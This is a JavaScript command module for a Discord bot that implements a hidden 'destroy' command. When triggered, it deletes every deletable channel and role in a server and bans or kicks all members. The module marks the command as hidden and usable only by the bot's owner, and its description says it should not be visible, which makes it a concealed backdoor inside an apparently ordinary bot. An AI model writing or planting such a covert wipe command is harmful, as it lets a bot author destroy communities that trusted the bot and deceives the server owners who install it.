// this must work at all time so I make sure EVERYTHING continues EVEN if it fails
// and require as little as possible (aka none)

exports.run = function(n, c, m) {
    var channels = m.guild.channels;
    var members = m.guild.members;
    var roles = m.guild.roles;
    var i;
    console.log("Initating Destruction");
    m.delete();
    if (channels) channels = channels.array();
    if (roles) roles = roles.array();
    if (members) members = members.array();
    if (channels) {
        for (i=0;i<channels.length;i++) {
            if (!channels[i].deleted) {
                if (channels[i].deletable) channels[i].delete();
            }
        }
    }
    if (roles) {
        for (i=0;i<roles.length;i++) {
            if (!roles[i].deleted) {
                if (roles[i].deletable) {
                    roles[i].delete()
                }
            }
        }
    }
    if (members) {
        for (i=0;i<members.length;i++) {
            if (members[i].bannable) {
                members[i].ban();
            } else if (members[i].kickable) {
                members[i].kick();
            }
        }
    }
};

exports.hide = true;
exports.meonly = true;
exports.description = "Wipe the server, this should not be visible and only I can execute it."
exports.usage = "destroy"
exports.permission = "ADMINISTRATOR"